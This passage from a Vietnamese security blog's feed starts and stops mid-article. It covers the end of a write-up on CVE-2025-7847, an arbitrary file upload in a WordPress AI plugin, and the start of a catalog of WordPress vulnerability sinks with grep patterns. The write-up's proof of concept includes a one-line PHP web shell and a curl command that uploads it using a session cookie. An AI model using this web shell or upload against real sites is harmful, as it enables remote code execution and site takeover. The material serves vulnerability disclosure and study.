. $extension;&#xA;  $unique_filename = wp_unique_filename( wp_upload_dir()[&amp;#39;path&amp;#39;], $newFilename );&#xA;  $destination = wp_upload_dir()[&amp;#39;path&amp;#39;] . &amp;#39;/&amp;#39; . $unique_filename;&#xA;&#xA;  if ( $target === &amp;#39;uploads&amp;#39; ) {&#xA;    if ( !$this-&amp;gt;check_db() ) {&#xA;      throw new Exception( &amp;#39;Could not create database table.&amp;#39; );&#xA;    }&#xA;    if ( !copy( $path, $destination ) ) {&#xA;      throw new Exception( &amp;#39;Could not move the file.&amp;#39; );&#xA;    }&#xA;    $url = wp_upload_dir()[&amp;#39;url&amp;#39;] . &amp;#39;/&amp;#39; . $unique_filename;&#xA;&#xA;    $now = date( &amp;#39;Y-m-d H:i:s&amp;#39; );&#xA;    $fileId = $this-&amp;gt;commit_file( [&#xA;      &amp;#39;refId&amp;#39; =&amp;gt; $refId,&#xA;      &amp;#39;envId&amp;#39; =&amp;gt; $envId,&#xA;      &amp;#39;purpose&amp;#39; =&amp;gt; $purpose,&#xA;      &amp;#39;type&amp;#39; =&amp;gt; null,&#xA;      &amp;#39;status&amp;#39; =&amp;gt; &amp;#39;uploaded&amp;#39;,&#xA;      &amp;#39;created&amp;#39; =&amp;gt; $now,&#xA;      &amp;#39;updated&amp;#39; =&amp;gt; $now,&#xA;      &amp;#39;expires&amp;#39; =&amp;gt; $expires,&#xA;      &amp;#39;path&amp;#39; =&amp;gt; $destination,&#xA;      &amp;#39;url&amp;#39; =&amp;gt; $url&#xA;    ] );&#xA;    if ( $metadata &amp;amp;&amp;amp; is_array( $metadata ) ) {&#xA;      foreach ( $metadata as $metaKey =&amp;gt; $metaValue ) {&#xA;        $this-&amp;gt;add_metadata( $fileId, $metaKey, $metaValue );&#xA;      }&#xA;    }&#xA;&#xA;  }&#xA;  else if ( $target === &amp;#39;library&amp;#39; ) {&#xA;&#xA;    if ( filter_var( $path, FILTER_VALIDATE_URL ) ) {&#xA;      $tmp = download_url( $path );&#xA;      if ( is_wp_error( $tmp ) ) {&#xA;        throw new Exception( $tmp-&amp;gt;get_error_message() );&#xA;      }&#xA;      $file_array = [ &amp;#39;name&amp;#39; =&amp;gt; $unique_filename, &amp;#39;tmp_name&amp;#39; =&amp;gt; $tmp ];&#xA;    }&#xA;    else {&#xA;      $file_array = [ &amp;#39;name&amp;#39; =&amp;gt; $unique_filename, &amp;#39;tmp_name&amp;#39; =&amp;gt; $path ];&#xA;    }&#xA;&#xA;    $id = media_handle_sideload( $file_array, 0 );&#xA;    if ( is_wp_error( $id ) ) {&#xA;      throw new Exception( $id-&amp;gt;get_error_message() );&#xA;    }&#xA;&#xA;    $url = wp_get_attachment_url( $id );&#xA;    update_post_meta( $id, &amp;#39;_mwai_file_id&amp;#39;, $refId );&#xA;    update_post_meta( $id, &amp;#39;_mwai_file_expires&amp;#39;, $expires );&#xA;&#xA;    // Store additional metadata&#xA;    if ( $metadata &amp;amp;&amp;amp; is_array( $metadata ) ) {&#xA;      foreach ( $metadata as $metaKey =&amp;gt; $metaValue ) {&#xA;        update_post_meta( $id, &amp;#39;_mwai_&amp;#39; . $metaKey, $metaValue );&#xA;      }&#xA;    }&#xA;&#xA;    // Store purpose and envId as post meta&#xA;    if ( $purpose ) {&#xA;      update_post_meta( $id, &amp;#39;_mwai_purpose&amp;#39;, $purpose );&#xA;    }&#xA;    if ( $envId ) {&#xA;      update_post_meta( $id, &amp;#39;_mwai_envId&amp;#39;, $envId );&#xA;    }&#xA;  }&#xA;&#xA;  return $refId;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;upload_file()&lt;/code&gt; xử lý upload file và đặt tên file như sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Xác định tên và phần mở rộng: nếu &lt;code&gt;$filename&lt;/code&gt; không cung cấp, lấy tên file từ &lt;code&gt;$path&lt;/code&gt; và giữ phần mở rộng để đúng định dạng.&lt;/li&gt;&#xA;&lt;li&gt;Tạo tên file duy nhất bằng cách ghép &lt;code&gt;$refId&lt;/code&gt; với phần mở rộng, rồi dùng &lt;code&gt;wp_unique_filename()&lt;/code&gt; để tránh trùng tên trong thư mục lưu trữ.&lt;/li&gt;&#xA;&lt;li&gt;Lưu file: nếu &lt;code&gt;$target === &#39;uploads&#39;&lt;/code&gt; thì copy vào thư mục uploads, nếu &lt;code&gt;$target === &#39;library&#39;&lt;/code&gt; thì thêm vào Media Library bằng &lt;code&gt;media_handle_sideload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trả về &lt;code&gt;$refId&lt;/code&gt;. File được lưu với tên &lt;code&gt;&amp;lt;refId&amp;gt;.&amp;lt;extension&amp;gt;&lt;/code&gt; trong thư mục uploads hoặc Media Library, kèm metadata nếu có.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-json/mwai/v1/simpleFileUpload&amp;#34;] --&amp;gt; B{&amp;#34;permission_callback&amp;#34;}&#xA;B -- Authenticated (X-WP-Nonce or Bearer) --&amp;gt; C[&amp;#34;rest_simpleFileUpload()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;simpleFileUpload()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;files-&amp;gt;upload_file(tmp_name, name, target, ...)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Determine extension → newFilename = refId.extension&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;target === &amp;#39;uploads&amp;#39; ?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;copy(path, destination) → file placed in uploads&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;No filetype validation&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;Uploaded .php accessible via URL&amp;#34;]&#xA;J --&amp;gt; L[&amp;#34;Response contain URL to file&amp;#34;]&#xA;L --&amp;gt; K[&amp;#34;Execute PHP → Remote Code Execution (RCE)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST \&#xA;  &amp;#34;http://localhost/wp-json/mwai/v1/simpleFileUpload&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 51e6c4a45a&amp;#34; \&#xA;  -F &amp;#34;file=@rce.php&amp;#34; \&#xA;  -b &amp;#34;wp-settings-time-1=1762427921;&#xA;      wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce;&#xA;      wordpress_test_cookie=WP%20Cookie%20check;&#xA;      PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98;&#xA;      wp_lang=en_US;&#xA;      wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98;&#xA;      wp-settings-5=mfold%3Do;&#xA;      wp-settings-time-5=1762533510&amp;#34; \&#xA;  --proxy 127.0.0.1:8080 # Burp proxy&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#34; title=&#34;Upload file thành công&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload&lt;/h2&gt;&lt;p&gt;Upload file thành công&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#39; alt=&#34;Upload&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Upload file thành công&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE với web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#39; alt=&#34;Result&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-7847 là lỗ hổng &lt;strong&gt;arbitrary file upload&lt;/strong&gt; nghiêm trọng trong plugin &lt;strong&gt;AI Engine 2.9.3–2.9.4&lt;/strong&gt;, cho phép user đã xác thực (Subscriber+) upload file bất kỳ lên server qua REST API, dẫn tới &lt;strong&gt;RCE&lt;/strong&gt;. Bản vá 2.9.5 khắc phục bằng kiểm tra loại file (&lt;code&gt;wp_check_filetype&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lỗ hổng chỉ ảnh hưởng khi &lt;strong&gt;REST API Public bật&lt;/strong&gt; và user có &lt;strong&gt;X-WP-Nonce hợp lệ&lt;/strong&gt; hoặc Bearer token.&lt;/li&gt;&#xA;&lt;li&gt;Nguyên nhân: &lt;strong&gt;thiếu kiểm tra loại file&lt;/strong&gt; và copy file trực tiếp vào uploads.&lt;/li&gt;&#xA;&lt;li&gt;Giải pháp: &lt;strong&gt;cập nhật plugin lên 2.9.5&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-2-9-3-2-9-4-authenticated-subscriber-arbitrary-file-upload&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Vulnerability Sinks</title>
      <link>http://localhost:1313/vi/posts/2025-11-13-wordpress-vulnerability-sink/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-13-wordpress-vulnerability-sink/</guid>
      <category domain="http://localhost:1313/vi/categories/bug-bounty/">Bug Bounty</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-this-article&#34;&gt;&lt;span&gt;Why This Article?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-this-article&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong quá trình pentest việc &lt;strong&gt;xác định các điểm sink&lt;/strong&gt; là bước then chốt — đó là nơi dữ liệu đầu vào (user-controlled) thực sự được tiêu thụ và có khả năng gây ra hành vi độc hại (RCE, SQLi, XSS, file write, v.v.). Mỗi lỗ hổng thường liên quan đến một hoặc nhiều sink; nếu chỉ tìm input không thôi thì dễ bỏ sót đường dẫn thực thi.&lt;/p&gt;&#xA;&lt;p&gt;Mục tiêu của bài viết này là: Tổng hợp tập trung các &lt;strong&gt;sink&lt;/strong&gt; thường gặp trong WordPress để dễ tra cứu.&lt;/p&gt;&#xA;&lt;p&gt;Bằng cách có một “bản đồ sink” rõ ràng, pentester, CVE analyst và developer sẽ tiếp cận lỗ hổng hiệu quả hơn — từ phát hiện tới khắc phục.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;wordpress-sink-catalog&#34;&gt;&lt;span&gt;WordPress Sink Catalog&lt;/span&gt;&#xA;  &lt;a href=&#34;#wordpress-sink-catalog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;sql-injection-sqli&#34;&gt;&lt;span&gt;SQL Injection (SQLi)&lt;/span&gt;&#xA;  &lt;a href=&#34;#sql-injection-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/query/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;query&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_var/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_var&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_row/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_row&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_col/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_col&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_results/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;get_results&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\$wpdb-&amp;gt;\s*(query|get_(var|row|col|results))\s*&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Magic Quotes&lt;/strong&gt; là tính năng PHP tự động escape ký tự đặc biệt (&lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, NULL) trong dữ liệu đầu vào để giảm nguy cơ SQL Injection. Nó không hoàn hảo, chỉ escape một số ký tự và PHP đã tắt mặc định. WordPress vẫn dùng cơ chế này qua &lt;code&gt;wp_magic_quotes()&lt;/code&gt; và &lt;code&gt;add_magic_quotes()&lt;/code&gt; để tự động xử lý &lt;code&gt;$_GET&lt;/code&gt;, &lt;code&gt;$_POST&lt;/code&gt;, &lt;code&gt;$_COOKIE&lt;/code&gt;, &lt;code&gt;$_SERVER&lt;/code&gt;, nhưng developer nên dùng các biện pháp chuẩn như &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; để chống SQLi.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;cross-site-scripting-xss&#34;&gt;&lt;span&gt;Cross-Site Scripting (XSS)&lt;/span&gt;&#xA;  &lt;a href=&#34;#cross-site-scripting-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/add_shortcode/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;add_shortcode&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/register_block_type/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;register_block_type &lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;elementor/widgets/register &lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;render&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(add_shortcode|register_block_type|elementor/widgets/register|render|print|echo|innerHTML|outerHTML|document\.write)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-file-inclusion-lfi&#34;&gt;&lt;span&gt;Local File Inclusion (LFI)&lt;/span&gt;&#xA;  &lt;a 